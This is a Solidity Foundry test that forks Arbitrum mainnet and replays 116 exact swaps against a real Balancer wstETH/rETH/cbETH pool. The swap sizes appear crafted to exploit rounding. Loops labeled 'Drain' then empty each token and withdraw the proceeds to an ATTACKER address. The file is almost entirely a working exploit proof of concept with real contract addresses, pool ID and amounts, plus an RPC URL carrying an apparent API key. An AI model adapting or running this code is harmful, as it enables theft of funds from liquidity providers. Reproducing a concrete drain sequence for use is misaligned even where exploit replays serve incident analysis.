// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }
    enum UserBalanceOpKind { DEPOSIT_INTERNAL, WITHDRAW_INTERNAL, TRANSFER_INTERNAL, TRANSFER_EXTERNAL }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        IAsset assetIn;
        IAsset assetOut;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    struct UserBalanceOp {
        UserBalanceOpKind kind;
        IAsset asset;
        uint256 amount;
        address sender;
        address payable recipient;
    }

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external payable returns (uint256);

    function getPoolTokens(bytes32 poolId)
        external view
        returns (
            IERC20[] memory tokens,
            uint256[] memory balances,
            uint256 lastChangeBlock
        );

    function manageUserBalance(UserBalanceOp[] memory ops) external payable;

    function getInternalBalance(address user, IERC20[] memory tokens)
        external view
        returns (uint256[] memory balances);
}

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function symbol() external view returns (string memory);
}

contract BalancerArbitrumSwapsTest is Test {
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    bytes32 constant POOL_ID = 0x4a2f6ae7f3e5d715689530873ec35593dc28951b000000000000000000000481;
    address constant POOL_BPT = 0x4a2F6Ae7F3e5D715689530873ec35593Dc28951B;
    address constant cbETH = 0x1DEBd73E752bEaF79865Fd6446b0c970EaE7732f; // Index 0
    address constant wstETH = 0x5979D7b546E38E414F7E9822514be443A4800529; // Index 2
    address constant rETH = 0xEC70Dcb4A1EFa46b8F2D97C310C9c4790ba5ffA8; // Index 3

    address constant ATTACKER = address(0x2770);

    address constant WETH_WHALE = 0x489ee077994B6658eAfA855C308275EAd8097C4A; // Arbitrum WETH holder

    struct ExactSwapData {
        address tokenIn;
        address tokenOut;
        uint256 amount;        // GIVEN_OUT amount
        uint256 expectedIn;    // Expected amount to pay (param_0)
        uint8 indexIn;
        uint8 indexOut;
    }

    function setUp() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.arbitrum-mainnet.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            396293444
        );
    }

    function testArbitrumExactSwaps() public {
        console.log("Pool: wstETH/rETH/cbETH");

        (, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID);

        console.log("INITIAL STATE:");
        console.log("cbETH (index 0):", initialBalances[0]);
        console.log("BPT (index 1):", initialBalances[1]);
        console.log("wstETH (index 2):", initialBalances[2]);
        console.log("rETH (index 3):", initialBalances[3]);

        // Bootstrap: Fund attacker with tokens to get BPT
        // Give attacker some cbETH, wstETH and rETH to swap for BPT
        deal(cbETH, ATTACKER, 1000 ether);
        deal(wstETH, ATTACKER, 1000 ether);
        deal(rETH, ATTACKER, 1000 ether);

        vm.startPrank(ATTACKER);
        IERC20(POOL_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(cbETH).approve(address(VAULT), type(uint256).max);
        IERC20(wstETH).approve(address(VAULT), type(uint256).max);
        IERC20(rETH).approve(address(VAULT), type(uint256).max);

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER,
            fromInternalBalance: false,
            recipient: payable(ATTACKER),
            toInternalBalance: false});

        // Bootstrap phase: Get initial BPT by swapping tokens

        // Swap cbETH for BPT
        IBalancerVault.SingleSwap memory bootstrapSwap1 = IBalancerVault.SingleSwap({
            poolId: POOL_ID,
            kind: IBalancerVault.SwapKind.GIVEN_IN,
            assetIn: IAsset(cbETH),
            assetOut: IAsset(POOL_BPT),
            amount: 500 ether,
            userData: ""});
        VAULT.swap(bootstrapSwap1, funds, 0, block.timestamp + 3600);

        // Swap wstETH for BPT
        IBalancerVault.SingleSwap memory bootstrapSwap2 = IBalancerVault.SingleSwap({
            poolId: POOL_ID,
            kind: IBalancerVault.SwapKind.GIVEN_IN,
            assetIn: IAsset(wstETH),
            assetOut: IAsset(POOL_BPT),
            amount: 500 ether,
            userData: ""});
        VAULT.swap(bootstrapSwap2, funds, 0, block.timestamp + 3600);

        // Swap rETH for BPT
        IBalancerVault.SingleSwap memory bootstrapSwap3 = IBalancerVault.SingleSwap({
            poolId: POOL_ID,
            kind: IBalancerVault.SwapKind.GIVEN_IN,
            assetIn: IAsset(rETH),
            assetOut: IAsset(POOL_BPT),
            amount: 500 ether,
            userData: ""});
        VAULT.swap(bootstrapSwap3, funds, 0, block.timestamp + 3600);

        uint256 bptBalance = IERC20(POOL_BPT).balanceOf(ATTACKER);
        console.log("BPT acquired:", bptBalance);

        // swaps from Arbitrum transaction
        ExactSwapData[116] memory swaps;
    
        swaps[0] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: cbETH, amount: 381478578866960950133, expectedIn: 407409503509418236936, indexIn: 1, indexOut: 0});
        swaps[1] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: wstETH, amount: 36014566637470003060, expectedIn: 42643309507948554941, indexIn: 1, indexOut: 2});
        swaps[2] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: rETH, amount: 40888512865421358094, expectedIn: 44466732936930249407, indexIn: 1, indexOut: 3});
        swaps[3] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: cbETH, amount: 3814785788669609501, expectedIn: 4071892041540237390, indexIn: 1, indexOut: 0});
        swaps[4] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: wstETH, amount: 360145666374700031, expectedIn: 426202342600850576, indexIn: 1, indexOut: 2});
        swaps[5] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: rETH, amount: 408885128654213581, expectedIn: 444427045849747920, indexIn: 1, indexOut: 3});
        swaps[6] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: cbETH, amount: 38147857886696095, expectedIn: 40696903248956923, indexIn: 1, indexOut: 0});
        swaps[7] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: cbETH, amount: 38147857886696095, expectedIn: 40696903248956923, indexIn: 1, indexOut: 0});
        swaps[8] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: rETH, amount: 4088851286542136, expectedIn: 4442029212104502, indexIn: 1, indexOut: 3});
        swaps[9] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: cbETH, amount: 381478578866961, expectedIn: 406749862066954, indexIn: 1, indexOut: 0});
        swaps[10] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: wstETH, amount: 36014566637470, expectedIn: 42442033239736, indexIn: 1, indexOut: 2});
        swaps[11] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: rETH, amount: 40888512865422, expectedIn: 44524298703173, indexIn: 1, indexOut: 3});
        swaps[12] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: cbETH, amount: 3814785788670, expectedIn: 4066562685395, indexIn: 1, indexOut: 0});
        swaps[13] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: wstETH, amount: 360145666375, expectedIn: 419937905020, indexIn: 1, indexOut: 2});
        swaps[14] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: rETH, amount: 408885128654, expectedIn: 449655691342, indexIn: 1, indexOut: 3});
        swaps[15] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: cbETH, amount: 38147857887, expectedIn: 40697662662, indexIn: 1, indexOut: 0});
        swaps[16] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: wstETH, amount: 3601456663, expectedIn: 4198394841, indexIn: 1, indexOut: 2});
        swaps[17] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: rETH, amount: 4088851286, expectedIn: 4498805285, indexIn: 1, indexOut: 3});
        swaps[18] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: cbETH, amount: 381478579, expectedIn: 407003640, indexIn: 1, indexOut: 0});
        swaps[19] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: wstETH, amount: 36014567, expectedIn: 41983780, indexIn: 1, indexOut: 2});
        swaps[20] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: rETH, amount: 40888513, expectedIn: 44988484, indexIn: 1, indexOut: 3});
        swaps[21] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: cbETH, amount: 3814785, expectedIn: 4070038, indexIn: 1, indexOut: 0});
        swaps[22] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: wstETH, amount: 360146, expectedIn: 419839, indexIn: 1, indexOut: 2});
        swaps[23] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: rETH, amount: 408885, expectedIn: 449886, indexIn: 1, indexOut: 3});
        swaps[24] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: cbETH, amount: 38148, expectedIn: 40701, indexIn: 1, indexOut: 0});
        swaps[25] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: wstETH, amount: 3601, expectedIn: 4199, indexIn: 1, indexOut: 2});
        swaps[26] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: rETH, amount: 4089, expectedIn: 4499, indexIn: 1, indexOut: 3});
        swaps[27] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: cbETH, amount: 382, expectedIn: 408, indexIn: 1, indexOut: 0});
        swaps[28] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: wstETH, amount: 37, expectedIn: 45, indexIn: 1, indexOut: 2});
        swaps[29] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: rETH, amount: 42, expectedIn: 47, indexIn: 1, indexOut: 3});
        swaps[30] = ExactSwapData({tokenIn: POOL_BPT, tokenOut: cbETH, amount: 4, expectedIn: 5, indexIn: 1, indexOut: 0});
        swaps[31] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 99999999991, expectedIn: 271675506601503, indexIn: 2, indexOut: 0});
        swaps[32] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 335977647858438, indexIn: 2, indexOut: 0});
        swaps[33] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 600000000000000, expectedIn: 5641, indexIn: 0, indexOut: 2});
        swaps[34] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 5633, expectedIn: 184984956499450, indexIn: 2, indexOut: 0});
        swaps[35] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 238255453263012, indexIn: 2, indexOut: 0});
        swaps[36] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 430000000000000, expectedIn: 194851, indexIn: 0, indexOut: 2});
        swaps[37] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 194843, expectedIn: 137221099682185, indexIn: 2, indexOut: 0});
        swaps[38] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 170855375362119, indexIn: 2, indexOut: 0});
        swaps[39] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 300000000000000, expectedIn: 1054, indexIn: 0, indexOut: 2});
        swaps[40] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 1046, expectedIn: 88942717936516, indexIn: 2, indexOut: 0});
        swaps[41] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 121159409690112, indexIn: 2, indexOut: 0});
        swaps[42] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 210000000000000, expectedIn: 517, indexIn: 0, indexOut: 2});
        swaps[43] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 509, expectedIn: 60355919895494, indexIn: 2, indexOut: 0});
        swaps[44] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 85948071355794, indexIn: 2, indexOut: 0});
        swaps[45] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 150000000000000, expectedIn: 730, indexIn: 0, indexOut: 2});
        swaps[46] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 722, expectedIn: 43835164776897, indexIn: 2, indexOut: 0});
        swaps[47] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 60960642706376, indexIn: 2, indexOut: 0});
        swaps[48] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 110000000000000, expectedIn: 159427, indexIn: 0, indexOut: 2});
        swaps[49] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 159419, expectedIn: 35350123534632, indexIn: 2, indexOut: 0});
        swaps[50] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 44047673747625, indexIn: 2, indexOut: 0});
        swaps[51] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 79000000000000, expectedIn: 12740, indexIn: 0, indexOut: 2});
        swaps[52] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 12732, expectedIn: 24704334539693, indexIn: 2, indexOut: 0});
        swaps[53] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 31381672127283, indexIn: 2, indexOut: 0});
        swaps[54] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 56000000000000, expectedIn: 4970, indexIn: 0, indexOut: 2});
        swaps[55] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 4962, expectedIn: 17274565299365, indexIn: 2, indexOut: 0});
        swaps[56] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 22309840236755, indexIn: 2, indexOut: 0});
        swaps[57] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 40000000000000, expectedIn: 11785, indexIn: 0, indexOut: 2});
        swaps[58] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 11777, expectedIn: 12549651657792, indexIn: 2, indexOut: 0});
        swaps[59] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 15959805658902, indexIn: 2, indexOut: 0});
        swaps[60] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 28000000000000, expectedIn: 994, indexIn: 0, indexOut: 2});
        swaps[61] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 986, expectedIn: 8296490265491, indexIn: 2, indexOut: 0});
        swaps[62] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 11336699902952, indexIn: 2, indexOut: 0});
        swaps[63] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 20000000000000, expectedIn: 1477, indexIn: 0, indexOut: 2});
        swaps[64] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 1469, expectedIn: 6003918023390, indexIn: 2, indexOut: 0});
        swaps[65] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 8052982469652, indexIn: 2, indexOut: 0});
        swaps[66] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 14000000000000, expectedIn: 594, indexIn: 0, indexOut: 2});
        swaps[67] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 586, expectedIn: 4053948624106, indexIn: 2, indexOut: 0});
        swaps[68] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 5717190379530, indexIn: 2, indexOut: 0});
        swaps[69] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 10000000000000, expectedIn: 832, indexIn: 0, indexOut: 2});
        swaps[70] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 824, expectedIn: 2942791492219, indexIn: 2, indexOut: 0});
        swaps[71] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 4063393371252, indexIn: 2, indexOut: 0});
        swaps[72] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 7300000000000, expectedIn: 38584, indexIn: 0, indexOut: 2});
        swaps[73] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 38576, expectedIn: 2445640336102, indexIn: 2, indexOut: 0});
        swaps[74] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 3087683502580, indexIn: 2, indexOut: 0});
        swaps[75] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 5500000000000, expectedIn: 4693, indexIn: 0, indexOut: 2});
        swaps[76] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 4685, expectedIn: 1706241702206, indexIn: 2, indexOut: 0});
        swaps[77] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 2216272868091, indexIn: 2, indexOut: 0});
        swaps[78] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 3900000000000, expectedIn: 1356, indexIn: 0, indexOut: 2});
        swaps[79] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 1348, expectedIn: 1167090256517, indexIn: 2, indexOut: 0});
        swaps[80] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 1579387742379, indexIn: 2, indexOut: 0});
        swaps[81] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 2800000000000, expectedIn: 4082, indexIn: 0, indexOut: 2});
        swaps[82] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 4074, expectedIn: 869603033065, indexIn: 2, indexOut: 0});
        swaps[83] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 1146695566488, indexIn: 2, indexOut: 0});
        swaps[84] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 2000000000000, expectedIn: 966, indexIn: 0, indexOut: 2});
        swaps[85] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 958, expectedIn: 593097926924, indexIn: 2, indexOut: 0});
        swaps[86] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 825645579238, indexIn: 2, indexOut: 0});
        swaps[87] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 1400000000000, expectedIn: 276, indexIn: 0, indexOut: 2});
        swaps[88] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 268, expectedIn: 385015136689, indexIn: 2, indexOut: 0});
        swaps[89] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 268, expectedIn: 385015136689, indexIn: 2, indexOut: 0});
        swaps[90] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 1000000000000, expectedIn: 295, indexIn: 0, indexOut: 2});
        swaps[91] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 287, expectedIn: 272242011310, indexIn: 2, indexOut: 0});
        swaps[92] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 422577321508, indexIn: 2, indexOut: 0});
        swaps[93] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 720000000000, expectedIn: 1010, indexIn: 0, indexOut: 2});
        swaps[94] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 1002, expectedIn: 189278920353, indexIn: 2, indexOut: 0});
        swaps[95] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 287568521781, indexIn: 2, indexOut: 0});
        swaps[96] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 480000000000, expectedIn: 1157, indexIn: 0, indexOut: 2});
        swaps[97] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 1149, expectedIn: 136019908378, indexIn: 2, indexOut: 0});
        swaps[98] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 216351637281, indexIn: 2, indexOut: 0});
        swaps[99] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 350000000000, expectedIn: 316, indexIn: 0, indexOut: 2});
        swaps[100] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 308, expectedIn: 86859687120, indexIn: 2, indexOut: 0});
        swaps[101] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 155213009675, indexIn: 2, indexOut: 0});
        swaps[102] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 240000000000, expectedIn: 112, indexIn: 0, indexOut: 2});
        swaps[103] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 104, expectedIn: 50938848835, indexIn: 2, indexOut: 0});
        swaps[104] = ExactSwapData({tokenIn: wstETH, tokenOut: cbETH, amount: 8, expectedIn: 108939564474, indexIn: 2, indexOut: 0});
        swaps[105] = ExactSwapData({tokenIn: cbETH, tokenOut: wstETH, amount: 160000000000, expectedIn: 59, indexIn: 0, indexOut: 2});
        swaps[106] = ExactSwapData({tokenIn: cbETH, tokenOut: POOL_BPT, amount: 10000, expectedIn: 2, indexIn: 0, indexOut: 1});
        swaps[107] = ExactSwapData({tokenIn: wstETH, tokenOut: POOL_BPT, amount: 10000000, expectedIn: 5834595, indexIn: 2, indexOut: 1});
        swaps[108] = ExactSwapData({tokenIn: rETH, tokenOut: POOL_BPT, amount: 10000000000, expectedIn: 6258166969, indexIn: 3, indexOut: 1});
        swaps[109] = ExactSwapData({tokenIn: cbETH, tokenOut: POOL_BPT, amount: 10000000000000, expectedIn: 37362524795, indexIn: 0, indexOut: 1});
        swaps[110] = ExactSwapData({tokenIn: wstETH, tokenOut: POOL_BPT, amount: 10000000000000000, expectedIn: 987689765720308, indexIn: 2, indexOut: 1});
        swaps[111] = ExactSwapData({tokenIn: rETH, tokenOut: POOL_BPT, amount: 10000000000000000000, expectedIn: 9862871696198828244, indexIn: 3, indexOut: 1});
        swaps[112] = ExactSwapData({tokenIn: cbETH, tokenOut: POOL_BPT, amount: 163494843838840439485, expectedIn: 4455279606583867, indexIn: 0, indexOut: 1});
        swaps[113] = ExactSwapData({tokenIn: wstETH, tokenOut: POOL_BPT, amount: 163494843838840439485, expectedIn: 19657862359507516, indexIn: 2, indexOut: 1});
        swaps[114] = ExactSwapData({tokenIn: rETH, tokenOut: POOL_BPT, amount: 163494843838840439485, expectedIn: 9665492270625015158, indexIn: 3, indexOut: 1});
        swaps[115] = ExactSwapData({tokenIn: cbETH, tokenOut: rETH, amount: 18000000000000000000, expectedIn: 5992912983529816883, indexIn: 0, indexOut: 3});
        
        console.log("Total swaps:", swaps.length);

        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""});

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) returns (uint256 amountIn) {
                console.log("Swap", i, "SUCCESS - AmountIn:", amountIn);
                successCount++;
            } catch Error(string memory reason) {
                console.log("Swap", i, "FAILED:", reason);
            } catch {
                console.log("Swap", i, "FAILED (no reason)");
            }

            if (i % 10 == 9) {
                (,uint256[] memory currentBal,) = VAULT.getPoolTokens(POOL_ID);
                console.log("After swap", i+1);
                console.log("  cbETH:", currentBal[0]);
                console.log("  BPT:", currentBal[1]);
                console.log("  wstETH:", currentBal[2]);
                console.log("  rETH:", currentBal[3]);
            }
        }

        console.log("Swaps executed:", successCount);
        console.log("Total swaps:", swaps.length);

        // Additional swaps
        (,uint256[] memory midBalances,) = VAULT.getPoolTokens(POOL_ID);
        uint256 additionalSwaps = 0;

        // Drain cbETH
        while (midBalances[0] > 1e9) {
            (,midBalances,) = VAULT.getPoolTokens(POOL_ID);
            uint256 toDrain = (midBalances[0] * 95) / 100;
            if (toDrain < 1e9) break;

            IBalancerVault.SingleSwap memory drainSwap = IBalancerVault.SingleSwap({
                poolId: POOL_ID,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(POOL_BPT),
                assetOut: IAsset(cbETH),
                amount: toDrain,
                userData: ""});

            try VAULT.swap(drainSwap, funds, type(uint256).max, block.timestamp + 3600) {
                additionalSwaps++;
            } catch {
                break;
            }

            if (additionalSwaps > 100) break;
        }

        // Drain wstETH
        while (midBalances[2] > 1e9) {
            (,midBalances,) = VAULT.getPoolTokens(POOL_ID);
            uint256 toDrain = (midBalances[2] * 95) / 100;
            if (toDrain < 1e9) break;

            IBalancerVault.SingleSwap memory drainSwap = IBalancerVault.SingleSwap({
                poolId: POOL_ID,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(POOL_BPT),
                assetOut: IAsset(wstETH),
                amount: toDrain,
                userData: ""});

            try VAULT.swap(drainSwap, funds, type(uint256).max, block.timestamp + 3600) {
                additionalSwaps++;
            } catch {
                break;
            }

            if (additionalSwaps > 100) break;
        }

        // Drain rETH
        while (midBalances[3] > 1e9) {
            (,midBalances,) = VAULT.getPoolTokens(POOL_ID);
            uint256 toDrain = (midBalances[3] * 95) / 100;
            if (toDrain < 1e9) break;

            IBalancerVault.SingleSwap memory drainSwap = IBalancerVault.SingleSwap({
                poolId: POOL_ID,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(POOL_BPT),
                assetOut: IAsset(rETH),
                amount: toDrain,
                userData: ""});

            try VAULT.swap(drainSwap, funds, type(uint256).max, block.timestamp + 3600) {
                additionalSwaps++;
            } catch {
                break;
            }

            if (additionalSwaps > 100) break;
        }

        console.log("Additional swaps:", additionalSwaps);
        console.log("=== WITHDRAWAL manageUserBalance()");

        IERC20[] memory internalTokens = new IERC20[](4);
        internalTokens[0] = IERC20(cbETH);
        internalTokens[1] = IERC20(POOL_BPT);
        internalTokens[2] = IERC20(wstETH);
        internalTokens[3] = IERC20(rETH);
        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);

        console.log("Internal balances:");
        console.log("  cbETH:", internalBalances[0]);
        console.log("  BPT:", internalBalances[1]);
        console.log("  wstETH:", internalBalances[2]);
        console.log("  rETH:", internalBalances[3]);

        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0 || internalBalances[3] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;
            if (internalBalances[3] > 0) opsCount++;
            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;
            if (internalBalances[0] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(cbETH), amount: internalBalances[0], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[1] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(POOL_BPT), amount: internalBalances[1], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[2] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(wstETH), amount: internalBalances[2], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[3] > 0) ops[opIndex] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(rETH), amount: internalBalances[3], sender: ATTACKER, recipient: payable(ATTACKER)});
            VAULT.manageUserBalance(ops);
            console.log("Withdrawal completed!");
        }
        vm.stopPrank();

        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID);

        console.log("FINAL STATE:");
        console.log("cbETH:", finalBalances[0]);
        console.log("BPT:", finalBalances[1]);
        console.log("wstETH:", finalBalances[2]);
        console.log("rETH:", finalBalances[3]);

        console.log("POOL DELTAS:");
        console.log("cbETH delta:");
        console.logInt(int256(finalBalances[0]) - int256(initialBalances[0]));
        console.log("BPT delta:");
        console.logInt(int256(finalBalances[1]) - int256(initialBalances[1]));
        console.log("wstETH delta:");
        console.logInt(int256(finalBalances[2]) - int256(initialBalances[2]));
        console.log("rETH delta:");
        console.logInt(int256(finalBalances[3]) - int256(initialBalances[3]));

        console.log("ATTACKER BALANCES:");
        console.log("cbETH:", IERC20(cbETH).balanceOf(ATTACKER));
        console.log("wstETH:", IERC20(wstETH).balanceOf(ATTACKER));
        console.log("rETH:", IERC20(rETH).balanceOf(ATTACKER));
        console.log("BPT:", IERC20(POOL_BPT).balanceOf(ATTACKER));

        console.log("Total swaps:", successCount + additionalSwaps);
        console.log("SUCCESS!");
    }
}
